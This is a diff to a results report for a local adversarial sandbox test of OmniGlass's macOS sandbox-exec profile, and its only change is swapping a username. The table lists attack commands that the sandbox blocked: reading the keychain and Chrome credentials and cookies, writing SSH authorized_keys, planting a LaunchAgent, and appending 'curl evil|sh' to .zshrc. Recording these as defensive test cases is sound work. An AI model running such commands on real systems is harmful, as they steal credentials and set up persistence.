@@ -1,7 +1,7 @@
 # OmniGlass v1.0.0-beta — Local Adversarial Sandbox Crucible — RESULTS
 
 - **Date:** 2026-06-05
-- **Host:** this machine (`Darwin 25.5.0`, arm64), user `localuser`
+- **Host:** this machine (`Darwin 25.5.0`, arm64), user `youruser`
 - **Target:** the REAL `sandbox-exec` profile emitted byte-for-byte from
   [`OmniGlass/src-tauri/src/mcp/sandbox/macos.rs`](../../OmniGlass/src-tauri/src/mcp/sandbox/macos.rs)
   (`generate_profile`), via the `#[path]`-included emitter
@@ -76,7 +76,7 @@ reasons documented under **Material Caveats**. The honest verdict is **CONDITION
 | V1.1e | `cat …/login.keychain-db` | PASS-SANDBOX | `cat deny(1) file-read-data …/login.keychain-db` |
 | V1.1f | `sqlite3 …/Chrome/Login Data` | PASS-SANDBOX | `sqlite3 deny(1) file-read-data …/Chrome…` |
 | V1.1g | `cat …/Chrome/Default/Cookies` | PASS-SANDBOX | `cat deny(1) file-read-data …/Chrome/Default…` |
-| V1.1h | `ls -la ~/` | PASS-SANDBOX | `ls deny(1) file-read-data /Users/localuser` |
+| V1.1h | `ls -la ~/` | PASS-SANDBOX | `ls deny(1) file-read-data /Users/youruser` |
 | V1.2a | `echo … >> ~/.ssh/authorized_keys` | PASS-SANDBOX | `bash deny(1) file-write-create …/authorized_keys` |
 | V1.2b | `cp evil.plist ~/Library/LaunchAgents/…` | PASS-SANDBOX | `cp deny(1) file-write-create …/LaunchAgents/com.evil…` |
 | V1.2c | `printf 'curl evil\|sh' >> ~/.zshrc` | PASS-SANDBOX | `bash deny(1) file-write-data …/.zshrc` |
